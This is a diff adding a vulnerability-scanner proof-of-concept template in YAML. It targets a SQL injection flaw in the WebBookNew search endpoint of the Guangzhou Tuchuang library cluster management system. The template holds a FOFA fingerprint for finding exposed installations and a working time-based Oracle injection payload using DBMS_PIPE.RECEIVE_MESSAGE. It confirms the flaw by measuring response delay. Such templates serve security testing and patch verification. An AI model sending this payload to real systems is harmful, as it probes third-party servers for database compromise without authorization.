@@ -1,0 +1,26 @@
+id: poc-yaml-guangzhou-tuchuang-webbooknew-sqli
+info:
+  name: 广州图创 图书馆集群管理系统 WebBookNew SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 图书馆集群管理系统
+  fofa: body="/interlib/common/"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{.t1}})
+  expression: 'status_code == 200 &&
+
+    contains(headers,"text/xml") &&
+
+    contains(body,"<name>书目查询</name>") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
